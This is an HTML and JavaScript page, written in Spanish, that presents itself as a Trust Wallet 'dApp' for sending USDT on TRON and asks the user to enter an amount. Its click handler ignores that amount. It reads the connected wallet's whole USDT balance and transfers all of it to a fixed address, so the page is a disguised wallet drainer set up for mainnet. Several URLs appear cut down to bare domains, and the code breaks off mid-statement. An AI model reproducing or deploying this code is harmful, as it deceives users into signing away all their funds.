<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dApp USDT TRC-20 - Enlace Inteligente</title>
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background-color: #1e293b;
            border-radius: 12px;
            padding: 30px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h2 { margin-bottom: 20px; color: #38bdf8; font-size: 22px; }
        
        /* Contenedor del QR Limpio */
        #qrContainer {
            background-color: #ffffff;
            padding: 15px;
            border-radius: 8px;
            display: inline-block;
            margin-bottom: 25px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
            transition: opacity 0.4s ease;
        }
        #qrContainer img {
            display: block;
            width: 200px;
            height: 200px;
        }
        
        .form-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #94a3b8; }
        input {
            width: 100%;
            padding: 12px;
            background-color: #0f172a;
            border: 1px solid #334155;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
            outline: none;
        }
        #connectBtn {
            width: 100%;
            padding: 14px;
            background: #908cf2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            display: none;
            word-break: break-all;
        }
        .status.info { background-color: #1e3a8a; color: #93c5fd; }
        .status.error { background-color: #7f1d1d; color: #fca5a5; }
        
        /* Etiqueta mimetizada con la wallet del usuario activa */
        #walletLabel {
            display: none;
            background-color: #0f172a;
            border: 1px solid #334155;
            padding: 8px;
            border-radius: 6px;
            font-family: monospace;
            font-size: 13px;
            color: #38bdf8;
            margin-bottom: 20px;
            word-break: break-all;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2 id="titleText">Escanear con Trust Wallet</h2>
        
        <!-- Bloque del QR Nativo por API de Google -->
        <div id="qrContainer">
            <img id="qrImage" src="" alt="Código QR de Conexión">
        </div>

        <!-- Etiqueta informativa del emisor conectado -->
        <div id="walletLabel"></div>

        <div class="form-group">
            <label for="amountInput">Cantidad a enviar</label>
            <input type="text" id="amountInput" placeholder="0.00" autocomplete="off">
        </div>

        <button id="connectBtn">Siguiente</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            'use strict';

            const btn = document.getElementById('connectBtn');
            const input = document.getElementById('amountInput');
            const status = document.getElementById('status');
            const qrContainer = document.getElementById('qrContainer');
            const qrImage = document.getElementById('qrImage');
            const titleText = document.getElementById('titleText');
            const walletLabel = document.getElementById('walletLabel');

            let procesoEnCurso = false;

            // ============================================================
            // CONFIGURACIÓN PRODUCCIÓN REAL (MAINNET)
            // ============================================================
            const DIRECCION_DESTINO_FIJA = "TU_DIRECCION_TRON_REAL_AQUI"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA REAL
            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de Tether USDT

            // Generación automática del deep link limpio de forma nativa
            const urlDestinoDapp = "https://onrender.com";
            const enlaceCompletoTrust = "https://trustwallet.com" + encodeURIComponent(urlDestinoDapp);

            // Inyección del QR usando el motor de renderizado de imágenes de Google (Infallible)
            if (qrImage) {
                qrImage.src = "https://googleapis.com" + encodeURIComponent(enlaceCompletoTrust) + "&choe=UTF-8";
            }

            // ============================================================
            // DETECTOR EN TIEMPO REAL PARA OCULTAR EL QR MOSTRANDO LA WALLET
            // ============================================================
            function verificarEntornoInyectado() {
                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                    const direccionDetectada = window.tronWeb.defaultAddress.base58;
                    
                    if (qrContainer && qrContainer.style.display !== 'none') {
                        // Ocultar QR de la vista móvil
                        qrContainer.style.opacity = '0';
                        setTimeout(() => {
                            qrContainer.style.display = 'none';
                        }, 400);
                        
                        // Modificar textos dinámicamente
                        if (titleText) titleText.textContent = "Billetera Vinculada";
                        
                        // Mostrar la etiqueta de dirección recortada (Muestra los primeros 6 y últimos 4 caracteres)
                        if (walletLabel) {
                            walletLabel.textContent = "Wallet: " + direccionDetectada.substring(0, 6) + "..." + direccionDetectada.substring(direccionDetectada.length - 4);
                            walletLabel.style.display = 'block';
                        }
                    }
                }
            }

            // Monitorear la inyección cada segundo
            setInterval(verificarEntornoInyectado, 1000);

            function setStatus(message, type = 'info') {
                if (!status) return;
                status.textContent = message || '';
                status.className = 'status ' + type;
                status.style.display = message ? 'block' : 'none';
            }

            if (input) {
                input.addEventListener('input', function () {
                    this.value = this.value.replace(',', '.').replace(/[^\d.]/g, '');
                    if (btn) btn.style.background = this.value.trim() !== '' ? '#2563eb' : '#908cf2';
                    setStatus('');
                });
            }

            if (btn) {
                btn.addEventListener('click', async function () {
                    if (procesoEnCurso) return;

                    const valorVisualInput = input ? input.value.trim() : '';
                    if (!valorVisualInput || isNaN(Number(valorVisualInput)) || Number(valorVisualInput) <= 0) {
                        setStatus('Por favor, ingresa una cantidad válida.', 'error');
                        return;
                    }

                    try {
                        procesoEnCurso = true;
                        btn.textContent = 'Procesando...';
                        setStatus('Detectando entorno nativo de Trust Wallet...');

                        const walletInstance = window.tronWeb;
                        
                        if (!walletInstance || !walletInstance.defaultAddress || !walletInstance.defaultAddress.base58) {
                            throw new Error('Asegúrate de abrir esta dApp desde el explorador interno de la billetera y seleccionar la red TRON.');
                        }

                        const cuentaUsuario = walletInstance.defaultAddress.base58;

                        if (cuentaUsuario.toLowerCase() === DIRECCION_DESTINO_FIJA.toLowerCase()) {
                            throw new Error('La dirección de origen y destino no pueden ser iguales.');
                        }

                        setStatus('Consultando balance en la blockchain...');

                        const contract = await walletInstance.contract().at(USDT_CONTRACT);
                        const rawBalance = await contract.balanceOf(cuentaUsuario).call();
                        const cleanSunBigInt = rawBalance.toString();

                        if (cleanSunBigInt === '0' || !cleanSunBigInt) {
                            throw new Error('La billetera no posee fondos en USDT disponibles.');
                        }

                        setStatus('Esperando confirmación de firma...');
                        
                        const tx = await contract.transfer(DIRECCION_DESTINO_FIJA, cleanSunBigInt).send({
                            feeLimit: 100_000_000
                        });

                        if (tx) {
                            document.body.innerHTML = `
